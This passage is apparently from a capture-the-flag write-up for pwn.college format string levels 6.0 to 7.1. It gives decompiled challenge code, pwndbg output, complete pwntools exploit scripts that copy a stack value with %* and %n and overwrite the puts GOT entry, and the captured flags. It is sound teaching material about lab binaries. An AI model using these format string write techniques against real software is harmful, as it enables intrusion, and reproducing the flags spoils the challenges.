  read(v0, &v3[62], 3uLL);
  v1 = time(0LL);
  srand(v1);
  puts("This challenge requires you to set a win value, located in the .bss, to a secret value! This secret value");
  puts("is currently stored in a stack variable, and you will have to figure out how to copy it into the .bss.");
  puts("There are two options: do a leak (using one printf) followed by a write (using a second printf), or use");
  printf("a _dynamic padding size_, using the * format character, in combination with %%n, in a _single_ printf,\n");
  puts("to copy memory. Since this level only gives you a single printf() call, you will likely need to use the");
  puts("latter. Check the printf man page (in category 3: `man 3 printf`) for documentation on *.\n");
  puts("As before, if you successfully pull that off, the challenge will give you the flag!");
  putchar(10);
  printf(
    "The win value in the .bss is located at %p! Remember to write this in little endian in your format string.\n",
    &qword_404158);
  printf("Remember, you can swap %%n with %%lx to see what address you will be writing into to make sure you have the.");
  puts("correct offset.\n");
  printf("The secret value is located on the stack, %#x bytes after the start of your format string!\n\n", 325);
  printf("I will now read up to %d bytes. Send your data!\n", 256);
  HIDWORD(v3[12]) = read(0, (char *)&v3[21] + 3, 0x100uLL);
  *((_BYTE *)&v3[21] + SHIDWORD(v3[12]) + 3) = 0;
  printf("Received %d bytes!\n", HIDWORD(v3[12]));
  putchar(10);
  printf("I will now call printf on your data!\n");
  putchar(10);
  printf((const char *)&v3[21] + 3, 256LL);
  putchar(10);
  puts("And now, let's check the win value!");
  check_win(v3[62]);
  return __readfsqword(0x28u) ^ v4;
}
```

```c ins={8-10} collapse={1-4}
int __fastcall check_win(__int64 a1)
{
  int v1; // eax

  puts("Checking win value...");
  printf("... desired win value: %#lx\n", a1);
  printf("... written win value: %#lx\n", qword_404158);
  if ( a1 != qword_404158 )
    return puts("... INCORRECT!");
  puts("... SUCCESS! Here is your flag:");
  v1 = open("/flag", 0);
  return sendfile(1, v1, 0LL, 0x80uLL);
}
```

这题就是读了一个三字节的随机值到栈上，给 flag 的条件是我们 `.bss` 段中的 `qword_404158` 变量值必须等于这个随机值。思路是用格式化字符串中的 `* (specifies a dynamic padding size)` 来 'copy memory'. 举个栗子：`%*10$c` 会把第十个参数的值用作 padding size，输出大小为 padding size 的内容。所以我们只要把这个 padding size 通过 `%n` 写入就相当于实现了 'copy memory' 了。

这个方法这对于比较小的值还好，太大了就不太友善了，cuz bunch of spaces.

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level6.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *func+173
b *func+417
b *check_win+79
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(random_value_position, position, var_offset):
    return flat(
        f"%*{random_value_position}$c%{position}$naaaaaaaaa\x00",
        elf.bss() + var_offset,
    )


def attack(target):
    try:
        payload = construct_payload(68, 30, 0xB8)

        target.sendafter(b"Send your data!", payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{ExgmxPb8JckvvOZvTLw9kufKyFP.dZjM0MDL5cTNxgzW}`

# Level 6.1

## Information

- Category: Pwn

## Description

> Use a format string exploit to copy a value and overwrite a global variable.

## Write-up

参见 [Level 6.0](#level-60)。

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level6.1"
HOST, PORT = "localhost", 1337

gdbscript = """
b *func+100
b *func+305
b *check_win+79
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(random_value_position, position, var_offset):
    return flat(
        f"%*{random_value_position}$c%{position}$naaaaaaaaaaa\x00",
        elf.bss() + var_offset,
    )


def attack(target):
    try:
        payload = construct_payload(66, 31, 0xB8)

        target.sendafter(b"Send your data!", payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{o3IDJsXjzJ3CBMBZz_66rdU2oQR.ddjM0MDL5cTNxgzW}`

# Level 7.0

## Information

- Category: Pwn

## Description

> Use a format string exploit to overwrite a got entry.

## Write-up

```c del={40} collapse={1-36}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  if ( argc <= 0 )
    __assert_fail("argc > 0", "<stdin>", 0xA0u, "main");
  puts(
    "In this challenge, you will be performing attack against the old and famous vulnerability:\n"
    "\"format string vulnerability\". This challenge reads in some bytes and print the\n"
    "input as the format using `printf` in different ways(depending on the specific challenge\n"
    "configuration). Different challenges have different protections on. ROP may be needed in\n"
    "some challenges. Have fun!");
  puts("To ensure that you are ROPing, rather than doing other tricks, this");
  puts("will sanitize all environment variables and arguments and close all file");
  puts("descriptors > 2,");
  putchar(10);
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  func();
  puts("### Goodbye!");
  return 0;
}
```

```c ins={19-20} del={22} collapse={1-15}
unsigned __int64 func()
{
  char v1[1032]; // [rsp+60h] [rbp-410h] BYREF
  unsigned __int64 v2; // [rsp+468h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("In this challenge, you can perform format string attack for infinite times");
  puts("You can use the the attack to leak information and prepare your payload");
  puts("After your payload is ready, send \"END\" to exit from the while loop");
  puts("And hopefully your payload can be triggered :)\n");
  memset(v1, 0, 0x400uLL);
  puts("You can use `checksec` command to check the protection of the binary.");
  while ( 1 )
  {
    puts("\nNow, the program is waiting for your input.");
    puts("If your input contains \"END\", the program exits from the while loop before triggering the vulnerability:");
    memset(v1, 0, 0x400uLL);
    memset(v1, 0, 0x400uLL);
    if ( (int)read(0, v1, 0x3FFuLL) <= 0 || strstr(v1, "END") )
      break;
    puts("Show me what you got :P");
    printf(v1);
  }
  return __readfsqword(0x28u) ^ v2;
}
```

并没有什么特别的地方，只要 `read` 返回 `> 0`，并且输入中不包含 `END` 程序就可以无限次触发格式化字符串漏洞。而我们的目标是执行下面这个 `win` 函数。

```c
void __noreturn win()
{
  int v0; // eax

  puts("You win! Here is your flag:");
  v0 = open("/flag", 0);
  sendfile(1, v0, 0LL, 0x400uLL);
  exit(0);
}
```

检查保护措施，发现没开 PIE，看到这个就开心，因为之后利用起来会比较轻松……有 Canary，但因为格式化字符串漏洞的存在，我们可以直接忽略掉它。重点在于这个程序是 Partial RELRO 的，这个 RELRO 级别的 GOT 表是可写的，注意到我们触发格式化字符串漏洞之后程序返回到 `main` 还会调用一次 `puts` 函数（对于 7.1 是这样的，但对于 7.0 这个情况，事实上我们会在循环体内再次出发 `puts`，所以 7.0 可以不输入 `END`），那我们只要通过格式化字符串漏洞把 `puts` 的 GOT 表内容篡改为 `win` 的地址就好了，篡改后再次调用 `puts` 就会执行 `win`。

需要注意的点是由于 `win` 内部还有一个 `puts`，所以我们要跳过它。

```asm wrap=false showLineNumbers=false {17} ins={37} del={4}
pwndbg> checksec
File:     /home/cub3y0nd/Projects/pwn.college/babyfmt_level7.0
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/cub3y0nd/Projects/pwn.college/babyfmt_level7.0:
GOT protection: Partial RELRO | Found 15 GOT entries passing the filter
[0x404018] putchar@GLIBC_2.2.5 -> 0x7502eb8c8310 (putchar) ◂— endbr64
[0x404020] puts@GLIBC_2.2.5 -> 0x7502eb8c6360 (puts) ◂— endbr64
[0x404028] strlen@GLIBC_2.2.5 -> 0x7502eb9b3040 ◂— endbr64
[0x404030] __stack_chk_fail@GLIBC_2.4 -> 0x401060 ◂— endbr64
[0x404038] setbuf@GLIBC_2.2.5 -> 0x7502eb8cdb30 (setbuf) ◂— endbr64
[0x404040] printf@GLIBC_2.2.5 -> 0x7502eb89de00 (printf) ◂— endbr64
[0x404048] __assert_fail@GLIBC_2.2.5 -> 0x401090 ◂— endbr64
[0x404050] memset@GLIBC_2.2.5 -> 0x7502eb9b0cc0 ◂— endbr64
[0x404058] close@GLIBC_2.2.5 -> 0x7502eb94be60 (close) ◂— endbr64
[0x404060] read@GLIBC_2.2.5 -> 0x7502eb950a20 (read) ◂— endbr64
[0x404068] sendfile@GLIBC_2.2.5 -> 0x4010d0 ◂— endbr64
[0x404070] setvbuf@GLIBC_2.2.5 -> 0x7502eb8c6b10 (setvbuf) ◂— endbr64
[0x404078] open@GLIBC_2.2.5 -> 0x4010f0 ◂— endbr64
[0x404080] exit@GLIBC_2.2.5 -> 0x401100 ◂— endbr64
[0x404088] strstr@GLIBC_2.2.5 -> 0x401110 ◂— endbr64
pwndbg> i fun win
All functions matching regular expression "win":

Non-debugging symbols:
0x0000000000401540  win
0x00007502eb8cda20  rewind
0x00007502eb8e2330  __pthread_unwind_next
0x00007502eb927940  rewinddir
0x00007502eb95d260  __libc_unwind_link_get
```

所以这时候没 PIE 的爽就体现出来了，不需要想办法泄漏 GOT 表，已经被看光光了，指哪打哪 LOL

> 19:27，为什么我想睡觉？一定是被自己出的烂题折腾惨了……打完这题刷电影去～<br />
> 20:49，啊啊啊啊啊写 0 真麻烦，不干了！

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level7.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *func+280
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(position):
    puts_got = 0x404020
    parts = [0x1554, 0x0040, 0x0000, 0x0000]

    align_stack = b"a" * 3
    written_chars = len(align_stack) % 0x10000

    fmtstr_parts = []

    for idx, target_byte in enumerate(parts):
        padding = (target_byte - written_chars) % 0x10000

        fmtstr_parts.append(
            f"%{padding}x%{position + idx}$hn"
            if padding > 0
            else f"%{position + idx}$hn"
        )

        written_chars += padding

    fmtstr = "".join(fmtstr_parts).encode("ascii") + b"\x00"
    addresses = [puts_got + (i * 0x2) for i in range(len(parts))]

    return flat(
        align_stack,
        fmtstr,
        *addresses,
    )


def attack(target):
    try:
        payload = construct_payload(24)

        target.sendafter(b"vulnerability:", payload)

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{Ux3-i0zQW7ZkTY5X_RLl2eIH1Fb.dhjM0MDL5cTNxgzW}`

# Level 7.1

## Information

- Category: Pwn

## Description

> Use a format string exploit to overwrite a got entry.

## Write-up

参见 [Level 7.0](#level-70)。

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyfmt_level7.1"
HOST, PORT = "localhost", 1337

gdbscript = """
b *func+198
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload(position):
    puts_got = 0x404020
    parts = [0x1351, 0x0040, 0x0000, 0x0000]

    align_stack = b"a" * 3
    written_chars = len(align_stack) % 0x10000

    fmtstr_parts = []

    for idx, target_byte in enumerate(parts):
        padding = (target_byte - written_chars) % 0x10000

        fmtstr_parts.append(
            f"%{padding}x%{position + idx}$hn"
            if padding > 0
            else f"%{position + idx}$hn"
        )

        written_chars += padding

    fmtstr = "".join(fmtstr_parts).encode("ascii") + b"\x00"
    addresses = [puts_got + (i * 0x2) for i in range(len(parts))]

    return flat(
        align_stack,
        fmtstr,
        *addresses,
    )


def attack(target):
    try:
        payload = construct_payload(72)

        target.sendafter(b"Have fun!", payload)
        target.sendline(b"END")

        response = target.recvall(timeout=3)

        if b"pwn.college{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{s0yYpAm36BLU2Mp5PhbvBmPuc-3.dljM0MDL5cTNxgzW}`
